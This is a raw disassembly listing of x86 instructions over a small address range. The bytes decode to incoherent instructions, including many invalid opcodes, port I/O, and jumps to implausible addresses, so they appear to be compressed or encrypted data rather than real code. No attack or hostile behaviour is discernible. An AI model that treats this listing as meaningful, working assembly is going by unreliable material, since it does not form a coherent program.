  40b0f4:	mov    al,0xd3
  40b0f6:	shl    DWORD PTR [ebx+0x40],cl
  40b0f9:	retf   0xa98a
  40b0fc:	add    bl,BYTE PTR ds:0xf7799e5f
  40b102:	xchg   edx,eax
  40b103:	nop
  40b104:	mov    ebp,0x36ac1fc2
  40b109:	mov    ebp,DWORD PTR [eax]
  40b10b:	ins    DWORD PTR es:[edi],dx
  40b10c:	shr    BYTE PTR [ebp-0x278e3ed3],cl
  40b112:	or     ebx,DWORD PTR [ecx+0x23]
  40b115:	xchg   DWORD PTR [ecx-0x67],ebx
  40b118:	ror    DWORD PTR [edi-0x1dd23f8b],1
  40b11e:	repz sub BYTE PTR [ebx],bl
  40b121:	lods   al,BYTE PTR ds:[esi]
  40b122:	pop    ebp
  40b123:	nop
  40b124:	or     eax,0x7c708cf5
  40b129:	shl    dh,0xb0
  40b12c:	retf   
  40b12d:	jno    0x40b0c4
  40b12f:	xor    BYTE PTR [eax-0x1],ch
  40b132:	jnp    0x40b152
  40b134:	pop    ds
  40b135:	aad    0x7e
  40b137:	inc    edx
  40b138:	pop    esi
  40b139:	repnz or DWORD PTR [edx],esi
  40b13c:	push   ss
  40b13d:	not    BYTE PTR [esi-0xa3be45a]
  40b143:	push   esp
  40b144:	jmp    0x40b0e4
  40b146:	mov    ch,0x81
  40b148:	add    al,0x19
  40b14a:	adc    BYTE PTR [ebx],0x52
  40b14d:	(bad)  
  40b14e:	out    0x8,eax
  40b150:	stos   BYTE PTR es:[edi],al
  40b151:	arpl   WORD PTR [esi+0x49912d09],sp
  40b157:	fdivr  QWORD PTR ds:[edx+0x6e]
  40b15b:	data16 jns 0x40b0e1
  40b15e:	out    dx,eax
  40b15f:	push   ecx
  40b160:	lock mov al,0x16
  40b163:	inc    edi
  40b164:	and    al,0xab
  40b166:	mov    bl,0xe
  40b168:	sbb    BYTE PTR [edx],dh
  40b16a:	xchg   BYTE PTR [eax-0x4a8b47e3],bl
  40b170:	es mov ebx,0x7a17b4a2
  40b176:	shr    al,1
  40b178:	xchg   BYTE PTR [edi-0xa],dh
  40b17b:	sar    esi,1
  40b17d:	pop    esi
  40b17e:	cmp    eax,0x448687b6
  40b183:	rol    esi,1
  40b185:	adc    DWORD PTR [edx-0x23405ffc],0x7a
  40b18c:	int3   
  40b18d:	and    al,0x5a
  40b18f:	mov    ebx,0x6d3815a9
  40b194:	mov    edx,0xa8898a38
  40b199:	or     eax,0x65263ea2
  40b19e:	push   ds
  40b19f:	inc    eax
  40b1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1a1:	rol    DWORD PTR ds:0x574dce79,cl
  40b1a7:	mov    BYTE PTR [esp+ecx*8],bl
  40b1aa:	jg     0x40b1c3
  40b1ac:	sbb    al,0x2c
  40b1ae:	add    BYTE PTR [ebp-0x7b56fa2d],bl
  40b1b4:	xchg   DWORD PTR [ebx],esp
  40b1b6:	mov    esi,DWORD PTR ss:[edx]
  40b1b9:	jnp    0x40b20e
  40b1bb:	add    eax,0xa13af3b5
  40b1c0:	dec    edi
  40b1c1:	mov    ch,0x7e
  40b1c3:	(bad)  
  40b1c4:	push   esp
  40b1c5:	xchg   esi,ebp
  40b1c7:	sub    edx,DWORD PTR [esi+0x16]
  40b1ca:	mov    ebx,0x3d42f617
  40b1cf:	add    ebx,DWORD PTR [ecx+0x37db296e]
  40b1d5:	lock mov ss,WORD PTR ds:0x5a8f199b
  40b1dc:	mov    bh,0x6b
  40b1de:	jmp    0x40b212
  40b1e0:	fnstenv [ebp+0x53]
  40b1e3:	ret    
  40b1e4:	mov    eax,0xd6267559
  40b1e9:	ret    0x861d
  40b1ec:	(bad)  
  40b1ed:	xchg   ebx,eax
  40b1ee:	leave  
  40b1ef:	push   ebp
  40b1f0:	push   ebx
  40b1f1:	xchg   ecx,eax
  40b1f2:	push   ss
  40b1f3:	outs   dx,DWORD PTR ds:[esi]
  40b1f4:	rol    BYTE PTR [eax-0x3f119afd],cl
  40b1fa:	xchg   ecx,eax
  40b1fb:	stc    
  40b1fc:	dec    eax
  40b1fd:	mov    esp,0x4235862a
  40b202:	mov    dl,0x2d
  40b204:	cmp    BYTE PTR [eax+0x74b3b713],dl
  40b20a:	add    DWORD PTR [eax-0x5c],0xfffffff7
  40b20e:	sub    BYTE PTR [ecx],dl
  40b210:	scas   eax,DWORD PTR es:[edi]
  40b211:	idiv   DWORD PTR [edx+edx*8+0x72e10869]
  40b218:	jecxz  0x40b280
  40b21a:	sub    edx,DWORD PTR [edx+0x6a]
  40b21d:	stos   BYTE PTR es:[edi],al
  40b21e:	xor    BYTE PTR [esi],0x38
  40b221:	inc    ebp
  40b222:	stos   BYTE PTR es:[edi],al
  40b223:	out    0x73,eax
  40b225:	pop    esp
  40b226:	push   0x24
  40b228:	mov    ah,0x49
  40b22a:	sbb    BYTE PTR [eax+ebx*1+0x2982838c],bl
  40b231:	and    ecx,DWORD PTR [ecx]
  40b233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b234:	inc    ebp
  40b235:	test   DWORD PTR [edi],0xa1ecf931
  40b23b:	test   eax,0x9720d15e
  40b240:	pop    edx
  40b241:	call   0xb0ec6a0b
  40b246:	(bad)  
  40b247:	rcr    DWORD PTR [ebx-0x14],1
  40b24a:	add    eax,0x4931a085
  40b24f:	xor    eax,ebx
  40b251:	jb     0x40b2d0
  40b253:	mov    cl,0x6b
  40b255:	sub    al,ah
  40b257:	loopne 0x40b23d
  40b259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b25a:	sub    dh,BYTE PTR [edx-0x7d]
  40b25d:	cli    
  40b25e:	in     al,0x9
  40b260:	or     eax,0x35ad6241
  40b265:	stos   DWORD PTR es:[edi],eax
  40b266:	or     DWORD PTR [edi+0x6c8cf5a0],ebp
  40b26c:	pusha  
  40b26d:	(bad)  
  40b26e:	jbe    0x40b238
  40b270:	into   
  40b271:	div    DWORD PTR [eax-0x6093aac1]
  40b277:	test   eax,0xd4db0906
  40b27c:	fstp   DWORD PTR [edx-0x63a19092]
  40b282:	jl     0x40b2f8
  40b284:	mov    bh,0xf6
  40b286:	bound  eax,QWORD PTR [ebp+0x58d08da3]
  40b28c:	cmp    bh,cl
  40b28e:	test   ch,dh
  40b290:	shl    BYTE PTR [edi+0x3f492b37],1
  40b296:	or     DWORD PTR [edi],ebp
  40b298:	retf   
  40b299:	(bad)  
  40b29a:	cs nop
  40b29c:	test   eax,0x18f0f074
  40b2a1:	imul   esi,DWORD PTR [esi-0x75],0xfffffffb
  40b2a5:	or     dl,BYTE PTR [edx]
  40b2a7:	test   WORD PTR gs:[esi],di
  40b2ab:	daa    
  40b2ac:	pushf  
  40b2ad:	sbb    eax,DWORD PTR ds:0xd5dca79c
  40b2b3:	add    al,BYTE PTR [ebx]
  40b2b5:	cdq    
  40b2b6:	into   
  40b2b7:	int3   
  40b2b8:	or     DWORD PTR [ebx-0x4273c7ac],edx
  40b2be:	xchg   ecx,eax
  40b2bf:	scas   al,BYTE PTR es:[edi]
  40b2c0:	push   0x37
  40b2c2:	fcomp  QWORD PTR [ecx+0x2b4e1589]
  40b2c8:	cmc    
  40b2c9:	jnp    0x40b2f0
  40b2cb:	nop
  40b2cc:	jmp    0xf62e:0x42b01a2
  40b2d3:	xor    eax,0x5f9abd0e
  40b2d8:	popf   
  40b2d9:	mov    ebp,0x744e8dcd
  40b2de:	and    eax,0x80895c4c
  40b2e3:	pop    es
  40b2e4:	leave  
  40b2e5:	adc    DWORD PTR [edx-0x5b],esp
  40b2e8:	jbe    0x40b29f
  40b2ea:	mov    ds:0x6fcc6311,eax
  40b2ef:	sub    dl,BYTE PTR [ebp+ebx*2+0x4e4927bd]
  40b2f6:	dec    esp
  40b2f7:	test   al,0x84
  40b2f9:	lods   eax,DWORD PTR ds:[esi]
  40b2fa:	xor    ch,BYTE PTR [ebp-0x1105d7c]
  40b300:	jmp    0x8aee512c
  40b305:	test   bl,cl
  40b307:	cwde   
  40b308:	mov    eax,ds:0x8a6a2c17
  40b30d:	sbb    DWORD PTR [edi-0x3c064b4c],ebp
  40b313:	data16 cld 
  40b315:	jae    0x40b36d
  40b317:	test   DWORD PTR ds:0x180cc096,edx
  40b31d:	(bad)  
  40b31e:	int3   
  40b31f:	cwde   
  40b320:	pextrw esi,(bad),0xc5
  40b322:	je     0x40b2c4
  40b324:	sub    al,0xbe
  40b326:	jge    0x40b2cb
  40b328:	dec    ebp
  40b329:	or     ecx,DWORD PTR [edx-0x50883825]
  40b32f:	lods   eax,DWORD PTR ds:[esi]
  40b330:	sub    esi,DWORD PTR [eax]
  40b332:	mov    esi,0xa7270910
  40b337:	out    0x7d,al
  40b339:	jmp    DWORD PTR [edx]
  40b33b:	pop    ebp
  40b33c:	std    
  40b33d:	mov    ebp,0xdcaa1490
  40b342:	adc    BYTE PTR [edi],ah
  40b344:	mov    WORD PTR [eax-0x6d460b4a],ss
  40b34a:	popf   
  40b34b:	adc    eax,0x7407d9bf
  40b350:	mov    ebp,DWORD PTR [esp+esi*8]
  40b353:	add    ebx,esi
  40b355:	cmp    edx,DWORD PTR [ecx]
  40b357:	scas   al,BYTE PTR es:[edi]
  40b358:	push   0x7e6c238e
  40b35d:	out    0x53,al
  40b35f:	pushf  
  40b360:	mov    dl,0x95
  40b362:	call   0xe8092350
  40b367:	mov    ch,0xf4
  40b369:	iret   
  40b36a:	leave  
  40b36b:	fimul  DWORD PTR [edx-0x2b]
  40b36e:	push   ebp
  40b36f:	pop    edx
  40b370:	xor    DWORD PTR [edx-0x42df0467],edi
  40b376:	loop   0x40b3f6
  40b378:	sbb    BYTE PTR [eax+0x33],dl
  40b37b:	cmp    eax,0x1ee0d473
  40b380:	addr16 jno 0x40b358
  40b383:	dec    edx
  40b384:	in     eax,0xc2
  40b386:	push   edx
  40b387:	mov    eax,0x2359a6c8
  40b38c:	lods   al,BYTE PTR ds:[esi]
  40b38d:	pop    edi
  40b38e:	fisttp DWORD PTR [eax-0x78]
  40b391:	xlat   BYTE PTR ds:[ebx]
  40b392:	(bad)  
  40b393:	stc    
  40b394:	pop    eax
  40b395:	mov    esi,0xb28cba24
  40b39a:	mov    ds:0x96fbf149,al
  40b39f:	jp     0x40b32b
  40b3a1:	lods   eax,DWORD PTR ds:[esi]
  40b3a2:	cwde   
  40b3a3:	sub    DWORD PTR [esi-0x4d],edi
  40b3a6:	or     BYTE PTR [esi],0x95
  40b3a9:	xor    eax,0x69eaa402
  40b3ae:	push   0xffffff87
  40b3b0:	ins    DWORD PTR es:[edi],dx
  40b3b1:	mov    edx,0x653b8e1
  40b3b6:	repnz stos DWORD PTR es:[edi],eax
  40b3b8:	and    dh,BYTE PTR [ebx]
  40b3ba:	jecxz  0x40b360
  40b3bc:	or     DWORD PTR [esi+0x2808975d],0x3b901e58
  40b3c6:	dec    esi
  40b3c7:	ret    0xcc01
  40b3ca:	loop   0x40b446
  40b3cc:	loop   0x40b430
  40b3ce:	ret    
  40b3cf:	pushf  
  40b3d0:	cmp    DWORD PTR [ebp+0x71],eax
  40b3d3:	in     al,0xe8
  40b3d5:	iret   
  40b3d6:	ret    0x2be6
  40b3d9:	xchg   edx,eax
  40b3da:	das    
  40b3db:	inc    ecx
  40b3dc:	int    0x6e
  40b3de:	(bad)  
  40b3df:	push   0x14
  40b3e1:	lds    ebp,FWORD PTR [esi]
  40b3e3:	sub    dh,BYTE PTR [edi]
  40b3e5:	cwde   
  40b3e6:	or     ecx,eax
  40b3e8:	sub    al,0x7e
  40b3ea:	adc    DWORD PTR [edi+0x1e],ebp
  40b3ed:	push   0xd35953c2
  40b3f2:	call   0xf0dd29c6
  40b3f7:	fs pop esp
  40b3f9:	pop    eax
  40b3fa:	or     eax,0x4e6f51b5
  40b3ff:	mov    es,eax
  40b401:	dec    ebx
  40b402:	push   ebx
  40b403:	out    dx,eax
  40b404:	add    ebx,DWORD PTR [edx]
  40b406:	jge    0x40b3c8
  40b408:	lods   al,BYTE PTR ds:[esi]
  40b409:	or     eax,0xfea1f469
  40b40e:	sti    
  40b40f:	sahf   
  40b410:	jmp    0x40b44f
  40b412:	fidiv  DWORD PTR [esi]
  40b414:	lods   al,BYTE PTR ds:[esi]
  40b415:	fbld   TBYTE PTR [ebp-0x10]
  40b418:	outs   dx,DWORD PTR ds:[si]
  40b41a:	adc    eax,0xc0adabb9
  40b41f:	pop    edi
  40b420:	fiadd  WORD PTR [ebx]
  40b422:	push   0x76
  40b424:	cs xchg esp,eax
  40b426:	push   ecx
  40b427:	scas   al,BYTE PTR es:[edi]
  40b428:	adc    ebp,edi
  40b42a:	mov    ebx,DWORD PTR [esi+0x77]
  40b42d:	cmp    al,0x1e
  40b42f:	(bad)  
  40b430:	stc    
  40b431:	out    dx,eax
  40b432:	mov    ah,0x27
  40b434:	je     0x40b3f8
  40b436:	xchg   esp,eax
  40b437:	popf   
  40b438:	sub    dl,BYTE PTR [esi-0x24]
  40b43b:	sbb    ah,BYTE PTR [ebp+esi*1+0x1861249b]
  40b442:	loop   0x40b455
  40b444:	sti    
  40b445:	aaa    
  40b446:	sub    DWORD PTR [edx-0x1d7fb5f9],ebx
  40b44c:	fild   DWORD PTR ds:0xc7e7ae4a
  40b452:	xor    DWORD PTR [ebx-0x1b],esi
  40b455:	jl     0x40b472
  40b457:	retf   
  40b458:	mov    WORD PTR [ebx+edi*4],ds
  40b45b:	push   ebp
  40b45c:	arpl   WORD PTR [esi+0x47876859],di
  40b462:	cmp    al,0xca
  40b464:	gs xchg esi,eax
  40b466:	jecxz  0x40b43e
  40b468:	inc    ebp
  40b469:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b46b:	pop    esp
  40b46c:	pop    ebx
  40b46d:	pop    eax
  40b46e:	jns    0x40b451
  40b470:	mov    dl,0x9d
  40b472:	repz pop es
  40b474:	sbb    BYTE PTR [ecx],bl
  40b476:	add    ebp,esi
  40b478:	mov    DWORD PTR [ebp+0x13],esi
  40b47b:	push   ecx
  40b47c:	scas   eax,DWORD PTR es:[edi]
  40b47d:	inc    edx
  40b47e:	sti    
  40b47f:	jp     0x40b4fa
  40b481:	fcmovnu st,st(4)
  40b483:	ins    DWORD PTR es:[edi],dx
  40b484:	push   ebp
  40b485:	inc    esp
  40b486:	push   edx
  40b487:	retf   
  40b488:	push   edi
  40b489:	jecxz  0x40b4ba
  40b48b:	cdq    
  40b48c:	shl    BYTE PTR [edi],0xfd
  40b48f:	ficomp WORD PTR cs:0x813ac7b3
  40b496:	out    dx,eax
  40b497:	lahf   
  40b498:	fiadd  DWORD PTR fs:[edx-0x3a11f73b]
  40b49f:	add    BYTE PTR [ebp-0x53],ch
  40b4a2:	test   DWORD PTR [edi-0x14c0ab52],ebp
  40b4a8:	dec    esp
  40b4a9:	ficom  WORD PTR [ebx-0x351b12f7]
  40b4af:	enter  0xc961,0x45
  40b4b3:	mov    ah,ah
  40b4b5:	dec    ebp
  40b4b6:	cmp    DWORD PTR ds:0xcd5f5539,esp
  40b4bc:	push   ss
  40b4bd:	cld    
  40b4be:	sub    BYTE PTR [edx+0xf627bdb],dh
  40b4c4:	not    DWORD PTR [ebx-0x308f442e]
  40b4ca:	daa    
  40b4cb:	cmp    ch,dh
  40b4cd:	mov    dl,BYTE PTR [edx+0x3bb53e83]
  40b4d3:	daa    
  40b4d4:	dec    ebp
  40b4d5:	pushf  
  40b4d6:	adc    al,al
  40b4d8:	in     al,dx
  40b4d9:	loopne 0x40b500
  40b4db:	dec    esi
  40b4dc:	cmp    eax,0x66be53
  40b4e1:	aam    0x79
  40b4e3:	(bad)  
  40b4e4:	shr    BYTE PTR [ebx-0x51988cee],cl
  40b4ea:	sub    DWORD PTR ds:0xfe464bfd,ebx
  40b4f0:	mov    ch,0x75
  40b4f2:	jge    0x40b51c
  40b4f4:	xchg   BYTE PTR [ebp-0x1c],bh
  40b4f7:	push   ecx
  40b4f8:	sar    DWORD PTR [ebp+0x3c],1
  40b4fb:	outs   dx,BYTE PTR ds:[esi]
  40b4fc:	mov    edx,0xaa15810
  40b501:	mov    ch,0xc6
  40b503:	adc    eax,0xb7d04787
  40b508:	shl    ebx,1
  40b50a:	sbb    ah,BYTE PTR [edi-0x6e]
  40b50d:	fcomip st,st(3)
  40b50f:	(bad)  
  40b510:	mov    edi,0x5deae0d1
  40b515:	shl    DWORD PTR [edx-0x40],cl
  40b518:	xchg   ebx,eax
  40b519:	sub    edx,esi
  40b51b:	(bad)  
  40b51c:	mov    ah,0xc7
  40b51e:	push   ecx
  40b51f:	dec    ebx
  40b520:	gs pop edx
  40b522:	mov    ch,0xcb
  40b524:	imul   ebx,DWORD PTR [edx-0x4],0xe
  40b528:	push   ds
  40b529:	es ds add al,0x36
  40b52d:	loop   0x40b580
  40b52f:	imul   ebx,DWORD PTR [edx],0x1d
  40b532:	out    0x23,al
  40b534:	adc    edx,DWORD PTR [ebx+0x1a]
  40b537:	mov    WORD PTR [ebp-0x37],?
  40b53a:	std    
  40b53b:	fsub   QWORD PTR ds:0x140975d8
  40b541:	call   0x4c36:0x1ccb4d1
  40b548:	xchg   edi,eax
  40b549:	pop    ss
  40b54a:	popf   
  40b54b:	xor    eax,0xc810d721
  40b550:	sbb    al,0x9
  40b552:	cmp    esp,DWORD PTR [ecx+0x279a03cc]
  40b558:	dec    ecx
  40b559:	je     0x40b543
  40b55b:	jmp    0xb6f944f9
  40b560:	rol    BYTE PTR [edx+ebx*8-0x2e],cl
  40b564:	stc    
  40b565:	pop    ss
  40b566:	inc    esp
  40b567:	xor    al,0xae
  40b569:	sbb    esi,edx
  40b56b:	es dec esp
  40b56d:	ins    BYTE PTR es:[edi],dx
  40b56e:	sbb    eax,0x56bcfd3
  40b573:	pop    es
  40b574:	mov    esi,0xaf0d546
  40b579:	xchg   DWORD PTR [edx+0x61118f03],ebp
  40b57f:	sti    
  40b580:	adc    eax,0xc15e3506
  40b585:	adc    eax,0xb231f6b5
  40b58a:	or     BYTE PTR [ecx-0x4851c225],bh
  40b590:	in     eax,dx
  40b591:	cwde   
  40b592:	sbb    ah,ch
  40b594:	clc    
  40b595:	aad    0x6a
  40b597:	or     BYTE PTR [eax-0x275858dd],al
  40b59d:	fistp  WORD PTR [ebx+ecx*8+0x73]
  40b5a1:	dec    edx
  40b5a2:	out    dx,eax
  40b5a3:	xchg   bh,cl
  40b5a5:	mov    eax,ds:0x3b8bf98e
  40b5aa:	inc    ebp
  40b5ab:	leave  
  40b5ac:	xchg   ecx,eax
  40b5ad:	mov    ds:0x28d64106,eax
  40b5b2:	retf   
  40b5b3:	push   ebx
  40b5b4:	mov    esi,0xf9061850
  40b5b9:	std    
  40b5ba:	cmp    dh,BYTE PTR [edi+eax*8]
  40b5bd:	xor    BYTE PTR [ecx+0x74],bl
  40b5c0:	mov    eax,0xbe02c016
  40b5c5:	das    
  40b5c6:	mov    dh,0x1d
  40b5c8:	test   eax,0x959d4881
  40b5cd:	retf   
  40b5ce:	xchg   edx,eax
  40b5cf:	xchg   esi,eax
  40b5d0:	in     al,dx
  40b5d1:	xchg   esp,eax
  40b5d2:	fstp   DWORD PTR [eax+ecx*1-0x5e]
  40b5d6:	inc    esi
  40b5d7:	pop    edi
  40b5d8:	idiv   DWORD PTR [esi]
  40b5da:	mov    bl,0xcf
  40b5dc:	das    
  40b5dd:	pop    es
  40b5de:	inc    ebp
  40b5df:	push   0xef4010f9
  40b5e4:	fwait
  40b5e5:	in     eax,0x7f
  40b5e7:	aas    
  40b5e8:	mov    bl,0xe4
  40b5ea:	lahf   
  40b5eb:	dec    ebp
  40b5ec:	arpl   cx,dx
  40b5ee:	adc    DWORD PTR [eax-0x12],esp
  40b5f1:	mov    ebx,0xc4bcf6c6
  40b5f6:	pushf  
  40b5f7:	push   edx
  40b5f8:	mov    dl,BYTE PTR [eax-0x4e190e6f]
  40b5fe:	xlat   BYTE PTR ds:[ebx]
  40b5ff:	add    DWORD PTR [ebx-0x4f],esi
  40b602:	dec    ebx
  40b603:	outs   dx,BYTE PTR ds:[esi]
  40b604:	pop    esi
  40b605:	leave  
  40b606:	rol    edx,cl
  40b608:	in     al,0xe5
  40b60a:	push   ebp
  40b60b:	out    dx,eax
  40b60c:	dec    cx
  40b60e:	stos   BYTE PTR es:[edi],al
  40b60f:	in     al,dx
  40b610:	jl     0x40b5e8
  40b612:	lods   al,BYTE PTR ds:[esi]
  40b613:	xchg   esp,eax
  40b614:	sub    al,0x81
  40b616:	xchg   ebp,eax
  40b617:	ins    DWORD PTR es:[edi],dx
  40b618:	iret   
  40b619:	out    0x1a,eax
  40b61b:	and    al,0xd9
  40b61d:	and    eax,0x777ed851
  40b622:	scas   al,BYTE PTR es:[edi]
  40b623:	cs and bh,bl
  40b626:	push   0x64cac736
  40b62b:	add    DWORD PTR [eax-0x5e6d85c2],0xb798b0e3
  40b635:	mov    ds:0x4cdd0a35,eax
  40b63a:	jnp    0x40b664
  40b63c:	mov    edx,0x3bffdf04
  40b641:	outs   dx,BYTE PTR ds:[esi]
  40b642:	bound  ebx,QWORD PTR [edi+0x77f4f3a3]
  40b648:	outs   dx,DWORD PTR ds:[esi]
  40b649:	dec    eax
  40b64a:	ins    BYTE PTR es:[edi],dx
  40b64b:	and    eax,0x90dcc03
  40b650:	clc    
  40b651:	pop    esi
  40b652:	jnp    0x40b680
  40b654:	lods   eax,DWORD PTR ds:[esi]
  40b655:	jb     0x40b650
  40b657:	div    DWORD PTR [edx]
  40b659:	jbe    0x40b657
  40b65b:	pop    ecx
  40b65c:	mov    bh,0xe8
  40b65e:	retf   
  40b65f:	mov    ah,0x86
  40b661:	ins    DWORD PTR es:[edi],dx
  40b662:	adc    ebx,edx
  40b664:	fdivr  st(6),st
  40b666:	mov    edx,esp
  40b668:	or     ebp,DWORD PTR ds:0xb0ea5925
  40b66e:	iret   
  40b66f:	retf   0xbc5a
  40b672:	mov    WORD PTR [ebx+0x2],ds
  40b675:	fcmovb st,st(5)
  40b677:	dec    edi
  40b678:	sub    edi,esp
  40b67a:	aam    0x74
  40b67c:	push   esp
  40b67d:	gs add eax,0x3dc1f393
  40b683:	pop    ecx
  40b684:	ret    
  40b685:	add    eax,0x71ab674d
  40b68a:	sbb    ebx,DWORD PTR [eax-0x18]
  40b68d:	shr    BYTE PTR [edx-0x49],cl
  40b690:	dec    ecx
  40b691:	sbb    al,0xc5
  40b693:	int    0x33
  40b695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b696:	adc    DWORD PTR [ebx+0x3c00a7ea],ebp
  40b69c:	out    0x55,al
  40b69e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69f:	mov    BYTE PTR [eax],al
  40b6a1:	leave  
  40b6a2:	sub    edx,DWORD PTR [ebx+edi*1]
  40b6a5:	or     al,BYTE PTR [ebp-0x77ef2f33]
  40b6ab:	addr16 sub al,0x9a
  40b6ae:	into   
  40b6af:	(bad)  
  40b6b0:	lods   al,BYTE PTR ds:[esi]
  40b6b1:	lods   al,BYTE PTR ds:[esi]
  40b6b2:	lods   eax,DWORD PTR ds:[esi]
  40b6b3:	cmp    ah,dh
  40b6b5:	dec    ebx
  40b6b6:	repz mov bh,0xd7
  40b6b9:	ds dec ebp
  40b6bb:	dec    ecx
  40b6bc:	cmp    DWORD PTR [edx],ebx
  40b6be:	jp     0x40b6b4
  40b6c0:	into   
  40b6c1:	outs   dx,DWORD PTR ds:[esi]
  40b6c2:	test   al,0x3d
  40b6c4:	pop    ss
  40b6c5:	mov    dh,0xcf
  40b6c7:	jg     0x40b6ea
  40b6c9:	mov    cs,WORD PTR [ebp-0x1d]
  40b6cc:	cmp    al,0x35
  40b6ce:	sub    DWORD PTR [ebp+0x6fae835c],ecx
  40b6d4:	jmp    0x40b6ee
  40b6d6:	lahf   
  40b6d7:	mov    al,0x84
  40b6d9:	adc    BYTE PTR [eax-0x44ece4c4],0x31
  40b6e0:	cwde   
  40b6e1:	(bad)  
  40b6e3:	mov    bl,dl
  40b6e5:	stos   DWORD PTR es:[edi],eax
  40b6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e7:	out    dx,eax
  40b6e8:	lock jb 0x40b6c3
  40b6eb:	push   ebx
  40b6ec:	ficomp DWORD PTR [eax-0x2f218b53]
  40b6f2:	jno    0x40b677
  40b6f4:	repz loopne 0x40b772
  40b6f7:	push   eax
  40b6f8:	xor    eax,ebp
  40b6fa:	push   esp
  40b6fb:	add    BYTE PTR [eax+0x8e3f0e5],al
  40b701:	fild   WORD PTR fs:[esi+0x144a1548]
  40b708:	icebp  
  40b709:	scas   eax,DWORD PTR es:[edi]
  40b70a:	into   
  40b70b:	push   es
  40b70c:	push   esp
  40b70d:	ret    
  40b70e:	stos   BYTE PTR es:[edi],al
  40b70f:	jmp    0x40b6af
  40b711:	sub    eax,0xd6b258ac
  40b716:	or     al,0x87
  40b718:	xchg   ebp,eax
  40b719:	into   
  40b71a:	inc    ebx
  40b71b:	cmp    ebp,esp
  40b71d:	icebp  
  40b71e:	mov    dh,0x2c
  40b720:	gs mov al,0x6e
  40b723:	push   ds
  40b724:	retf   
  40b725:	scas   al,BYTE PTR es:[edi]
  40b726:	push   ebx
  40b727:	js     0x40b6f3
  40b729:	(bad)  
  40b72a:	adc    esp,ecx
  40b72c:	push   esi
  40b72d:	sbb    DWORD PTR [ebx],esp
  40b72f:	into   
  40b730:	imul   ecx,DWORD PTR [eax+edi*2],0xffffffe4
  40b734:	(bad)  
  40b735:	push   edx
  40b736:	fst    DWORD PTR [ebx]
  40b738:	xchg   DWORD PTR [edx+edx*8+0x74],ebx
  40b73c:	int    0xc8
  40b73e:	mov    ebp,0x2d1ca5b9
  40b743:	or     eax,0xa9e5873c
  40b748:	fwait
  40b749:	leave  
  40b74a:	daa    
  40b74b:	cwde   
  40b74c:	xchg   BYTE PTR [edi-0x23adb477],al
  40b752:	sub    DWORD PTR [esi-0x2c],0x4cbe4e24
  40b759:	and    DWORD PTR [ebp-0x76b73d0e],esi
  40b75f:	sub    bl,ah
  40b761:	(bad)  
  40b762:	fist   WORD PTR [edx+0x22]
  40b765:	sub    edx,ecx
  40b767:	sahf   
  40b768:	(bad)  
  40b769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76a:	pop    esi
  40b76b:	fwait
  40b76c:	mov    ds,WORD PTR ds:0x1b5abc31
  40b772:	and    bl,BYTE PTR [edi]
  40b774:	mov    ?,esi
  40b776:	(bad)  
  40b777:	aad    0xe4
  40b779:	mov    bl,0x13
  40b77b:	popf   
  40b77c:	jecxz  0x40b728
  40b77e:	loop   0x40b721
  40b780:	dec    ebx
  40b781:	cmp    ebp,DWORD PTR ss:[ecx-0x3a0ddaf6]
  40b788:	pop    ebp
  40b789:	nop
  40b78a:	cmp    ecx,ebx
  40b78c:	cld    
  40b78d:	mov    al,0xec
  40b78f:	(bad)  
  40b792:	nop
  40b793:	mov    esp,0x60d9ba73
  40b798:	and    ecx,DWORD PTR gs:[ecx+0x2a538ec]
  40b79f:	xor    DWORD PTR [ebp-0x13],esp
  40b7a2:	adc    esp,DWORD PTR [eax]
  40b7a4:	xor    DWORD PTR [edi],ebx
  40b7a6:	call   0xd54a3554
  40b7ab:	dec    edi
  40b7ac:	das    
  40b7ad:	or     DWORD PTR [esi],0x60e7e652
  40b7b3:	and    BYTE PTR [ebx],bh
  40b7b5:	retf   
  40b7b6:	mov    al,0x62
  40b7b8:	pop    edx
  40b7b9:	jo     0x40b7db
  40b7bb:	jp     0x40b810
  40b7bd:	dec    eax
  40b7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7bf:	sbb    BYTE PTR [edi],ch
  40b7c1:	bswap  ebp
  40b7c3:	(bad)  
  40b7c4:	pop    ds
  40b7c5:	pop    ecx
  40b7c6:	mov    eax,0xbfd0d58
  40b7cb:	iret   
  40b7cc:	aas    
  40b7cd:	pop    ds
  40b7ce:	bound  eax,QWORD PTR [ecx-0x5b]
  40b7d1:	not    BYTE PTR [eax]
  40b7d3:	in     al,dx
  40b7d4:	scas   eax,DWORD PTR es:[edi]
  40b7d5:	adc    DWORD PTR [esp+ecx*1],0x9c4f4f43
  40b7dc:	rcl    edx,1
  40b7de:	jg     0x40b84a
  40b7e0:	into   
  40b7e1:	sbb    eax,0x762b36d0
  40b7e6:	inc    edi
  40b7e7:	aaa    
  40b7e8:	mov    cl,0x92
  40b7eb:	mov    bh,0xe1
  40b7ed:	sub    eax,0x8f30722b
  40b7f2:	jmp    0x5375:0x154f3c9f
  40b7f9:	dec    edx
  40b7fa:	pop    edi
  40b7fb:	fistp  DWORD PTR [edx-0x6b]
  40b7fe:	fistp  WORD PTR [esi]
  40b800:	jle    0x40b7ae
  40b802:	jns    0x40b7dd
  40b804:	jmp    0x8cf0:0x344d5b62
  40b80b:	out    dx,eax
  40b80c:	sub    ebx,DWORD PTR [ebx+0x7fb3e8c5]
  40b812:	push   es
  40b813:	lock pusha 
  40b815:	push   edx
  40b816:	xor    ah,BYTE PTR [edx-0x31]
  40b819:	and    eax,0xd30ca6a6
  40b81e:	aaa    
  40b81f:	iret   
  40b820:	outs   dx,BYTE PTR ds:[esi]
  40b821:	push   esp
  40b822:	dec    eax
  40b823:	dec    edx
  40b824:	mov    ds:0x8a2e64e,al
  40b829:	add    BYTE PTR [ebp-0x78],0x2e
  40b82d:	gs dec ebp
  40b82f:	nop
  40b830:	mov    eax,0x5ac26318
  40b835:	rol    DWORD PTR [edi-0x9201605],cl
  40b83b:	call   0xdb7a8673
  40b840:	ins    DWORD PTR es:[edi],dx
  40b841:	dec    edx
  40b842:	push   ss
  40b843:	das    
  40b844:	pushf  
  40b845:	xchg   edi,eax
